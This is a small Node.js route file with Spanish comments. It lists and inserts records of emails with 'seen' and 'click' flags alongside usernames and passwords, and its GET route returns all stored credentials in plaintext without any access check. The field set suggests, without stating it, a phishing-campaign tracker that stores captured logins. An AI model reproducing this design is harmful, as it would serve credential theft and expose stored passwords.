const pool = require('../models/database.js');

exports.install = function() {
    // GET /api/emails -> lista los correos
    ROUTE('/api/emails', getEmails, ['GET']);
    // POST /api/emails -> agrega un correo nuevo
    ROUTE('/api/emails', addEmail, ['POST']);
};

function getEmails() {
    const self = this;
    const query = `SELECT email, visto, click, user, password FROM correos`;
    pool.query(query, (err, rows) => {
        if (err) {
            console.error('Error al consultar correos:', err);
            return self.throw500(err);
        }
        self.json(rows);
    });
}

function addEmail() {
    const self = this;
    const data = self.body; 
    // data.email, data.visto, data.click, data.user, data.password

    const query = `
        INSERT INTO correos (email, visto, click, user, password)
        VALUES (?, ?, ?, ?, ?)
    `;
    // Ajusta si necesitas guardar "lista" en algún campo 
    // (se envía en data.lista, pero aquí no se está usando)

    pool.query(query, [ 
        data.email || '', 
        data.visto || 0, 
        data.click || 'off', 
        data.user || '', 
        data.password || '' 
    ], 
    (err, result) => {
        if (err) {
            console.error('Error al insertar correo:', err);
            return self.throw500(err);
        }
        self.json({ success: true, insertedId: result.insertId });
    });
}